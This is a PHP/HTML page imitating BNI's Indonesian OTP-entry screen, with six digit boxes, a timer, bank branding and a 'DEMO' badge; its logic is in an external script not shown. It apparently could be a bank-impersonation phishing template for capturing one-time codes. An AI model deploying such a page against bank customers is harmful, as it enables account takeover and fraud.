<?php
?> <html>
  <head>
    <title>BNI</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/common/css/global.css">
    <link rel="stylesheet" href="assets/common/css/otp.css">
    <link rel="stylesheet" href="assets/lib/ripple/dist/ripple.css">
    <script src="assets/common/js/jquery.js"></script>
    <script>
      const module = {};
    </script>
    <script type="module" src="assets/common/js/otp.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
  </head>
  <body>
    <div style="width: 100%; height: 100%; display: flex; flex-direction: column; background-color: #dde1e6;">
      <div style="padding: 10px; background-color: #e55300;">
        <img src="assets/common/img/img1.png" width="100px" height="50px">
      </div>
      <div style="width: 100%; flex: 1; overflow: scroll;">
        <div style="padding-left: 20px; padding-right: 20px; display: flex; flex-direction: column; align-items: center;">
            <img src="assets/common/img/logo.png" width="140px" height="40px" style="margin-top: 20px;">
            <div style="color: #006886; font-size: 17px; margin-top: 20px;">Masukkan kode OTP</div>
            <div style="color: #006886; font-size: 17px; margin-top: 0px;">Yang dikirim ke nomor <span id="phone"></span></div>
            <div style="padding-left: 30px; padding-right: 30px; display: flex; justify-content: center; flex-direction: row; align-items: center; margin-top: 20px;">
                <div style="width: 40px; height: 40px; border-radius: 10px; background-color: #dddddd; border: 1px solid #23bfbf;">
                    <input id="num1" type="number" style="width: 100%; height: 100%; text-align: center;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="1" >
                </div>
                <div style="width: 40px; height: 40px; border-radius: 10px; background-color: #dddddd; border: 1px solid #23bfbf; margin-left: 10px;">
                    <input id="num2" type="number" style="width: 100%; height: 100%; text-align: center;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="1" >
                </div>
                <div style="width: 40px; height: 40px; border-radius: 10px; background-color: #dddddd; border: 1px solid #23bfbf; margin-left: 10px;">
                    <input id="num3" type="number" style="width: 100%; height: 100%; text-align: center;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="1" >
                </div>
                <div style="width: 40px; height: 40px; border-radius: 10px; background-color: #dddddd; border: 1px solid #23bfbf; margin-left: 10px;">
                    <input id="num4" type="number" style="width: 100%; height: 100%; text-align: center;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="1" >
                </div>
                <div style="width: 40px; height: 40px; border-radius: 10px; background-color: #dddddd; border: 1px solid #23bfbf; margin-left: 10px;">
                    <input id="num5" type="number" style="width: 100%; height: 100%; text-align: center;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="1" >
                </div>
                <div style="width: 40px; height: 40px; border-radius: 10px; background-color: #dddddd; border: 1px solid #23bfbf; margin-left: 10px;">
                    <input id="num6" type="number" style="width: 100%; height: 100%; text-align: center;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="1" >
                </div>
            </div>
            <div id="timeout" style="color: #23bfbf; font-size: 20px; margin-top: 20px;"></div>
            <div style="color: #e55300; font-size: 10px; margin-top: 10px;">Belum terima OTP?</div>
            <div id="text1" style="color: #006886; font-size: 15px; font-weight: bold; margin-top: 10px;">Silahkan cek SMS untuk kode OTP</div>
            <div id="text2" style="color: #ff0000; font-size: 10px; font-weight: bold; margin-top: 10px; display: none;">Kode OTP kadaluwarsa, silahkan coba lagi</div>
            <div style="width: calc(100% - 20px); border-radius: 10px; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.4); margin-top: 30px; padding: 10px; color: #006886; font-size: 15px; background-color: #deeced;">
                <img src="assets/common/img/icon1.png" width="15px" height="15px" style="margin-right: 5px;">Kami akan melakukan proses verifikasi nomor HP setelah proses pembukaan rekening selesai diproses. Pastikan <b>nomor Anda memiliki pulsa dan terkoneksi jaringan internet.</b>
                <br/><br/>
                <img src="assets/common/img/icon2.png" width="15px" height="10px" style="margin-right: 5px;"><b>Jaga kerahasiaan OTP</b> dengan tidak memberitahu kepada siapapun termasuk kepada pihak bank.
            </div>
            <div style="color: #006886; font-size: 15px; text-align: center; margin-top: 40px; margin-bottom: 20px;">
                PT Bank Negara Indonesia (Persero) Tbk, berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta merupakan peserta penjaminan Lembaga Penjamin Simpanan.
            </div>
        </div>
      </div>
      <div id="loader" style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; display: none; justify-content: center; align-items: center;">
          <div class="loader"></div>
      </div>
      <div style="position: fixed; right: 10px; bottom: 10px; background-color: #ff0000; color: #ffffff; font-size: 20px; font-weight: bold; padding-left: 10px; padding-right: 10px; padding-top: 2px; padding-bottom: 2px;">DEMO</div>
    </div>
  </body>
</html>